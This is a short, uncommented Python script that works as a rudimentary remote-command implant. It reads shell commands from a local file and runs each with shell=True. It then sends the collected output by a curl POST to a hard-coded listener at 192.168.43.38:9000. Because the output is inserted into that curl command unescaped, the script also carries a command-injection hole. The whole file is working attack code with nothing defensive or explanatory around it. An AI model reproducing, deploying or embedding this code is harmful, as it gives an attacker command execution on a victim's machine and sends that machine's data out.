import subprocess

def run_command(command):

    command = command.rstrip()
    
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except Exception as e:
        output = "Failed to execute command " + str(e)
    return output

def POST_response(response):
    try:
        file_object = open("command_response.txt", "w")
        file_object.write(response)
        file_object.close()

        file_object = open("command_response.txt", "r+")
        data = file_object.readlines()
        formatted_response = ""
        for line in data:
            formatted_response += line + " SPLIT "
        file_object.close()
        COMMAND = "curl -d \"" + formatted_response + "\" -X POST \"http://192.168.43.38:9000\""
        run_command(COMMAND)
    except:
        pass

def fetch_execute_commands():
    
    file_object = open("commands.txt", "r")
    data = file_object.read()
    file_object.close()
    data = data.split("\n")
    response = ""
    for command in data:
        output = run_command(command)
        try:
            output = output.decode('utf-8')
            output.replace("\n", " SPLIT ")
        except:
            pass
        response = response + command + "--------------\n" + output + "\n"
    
    return response 

response = fetch_execute_commands()
POST_response(response)